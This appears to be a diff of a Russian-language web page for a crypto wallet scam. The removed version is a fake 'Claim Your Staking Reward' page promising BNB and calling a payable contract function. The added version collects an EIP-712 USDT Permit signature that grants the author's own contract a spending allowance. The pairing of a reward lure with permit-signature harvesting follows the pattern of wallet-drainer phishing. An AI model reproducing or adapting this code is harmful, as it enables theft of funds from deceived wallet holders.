@@ -2,45 +2,62 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Claim Staking Reward</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <title>Permit Test</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
-<body style="text-align:center; font-family:Arial; padding:50px; background:#0f0f0f; color:white;">
-    <h1>🎉 Claim Your Staking Reward!</h1>
-    <p>Connect wallet and claim up to 1.5 BNB + tokens</p>
-    <button onclick="window.ethereum.request({ method: 'eth_requestAccounts' })" style="...">
-        Claim Reward Now
-    </button>
+<body>
+    <button onclick="signPermit()">Сгенерировать Permit для USDT</button>
 
     <script>
-        const contractAddress = "0x1cA7d1Ed8CA46C5F20E651427b1Af1D2a8668C1C";
-        const abi = [
-            {
-                "inputs": [],
-                "name": "claimReward",
-                "outputs": [],
-                "stateMutability": "payable",
-                "type": "function"
-            }
-        ];
-
-        async function claimReward() {
+        async function signPermit() {
             if (typeof window.ethereum === 'undefined') {
-                alert("Установите MetaMask или Trust Wallet");
+                alert("MetaMask not found");
                 return;
             }
-            const web3 = new Web3(window.ethereum);
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            await provider.send("eth_requestAccounts", []);
+            const signer = provider.getSigner();
 
-            const contract = new web3.eth.Contract(abi, contractAddress);
-            const accounts = await web3.eth.getAccounts();
+            const tokenAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT
+            const contractAddress = "0xA1722bC16a0A0CFb68aC6795f84d96baC7dB88d7"; // твой контракт
+            const amount = ethers.utils.parseUnits("1", 18); // 1 USDT
+            const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-            try {
-                await contract.methods.claimReward().send({ from: accounts[0] });
-                alert("Reward claimed successfully! 🎉");
-            } catch (e) {
-                alert("Ошибка: " + e.message);
-            }
+            const token = new ethers.Contract(tokenAddress, [
+                "function nonces(address) view returns (uint256)",
+                "function DOMAIN_SEPARATOR() view returns (bytes32)"
+            ], signer);
+
+            const nonce = await token.nonces(await signer.getAddress());
+
+            const domain = {
+                name: "Tether USD",
+                version: "1",
+                chainId: 56,
+                verifyingContract: tokenAddress
+            };
+
+            const types = {
+                Permit: [
+                    { name: "owner", type: "address" },
+                    { name: "spender", type: "address" },
+                    { name: "value", type: "uint256" },
+                    { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" }
+                ]
+            };
+
+            const value = {
+                owner: await signer.getAddress(),
+                spender: contractAddress,
+                value: amount,
+                nonce: nonce,
+                deadline: deadline
+            };
+
+            const signature = await signer._signTypedData(domain, types, value);
+            console.log("Signature:", signature);
+            alert("Подпись сгенерирована! Смотри консоль (F12)");
         }
     </script>
 </body>
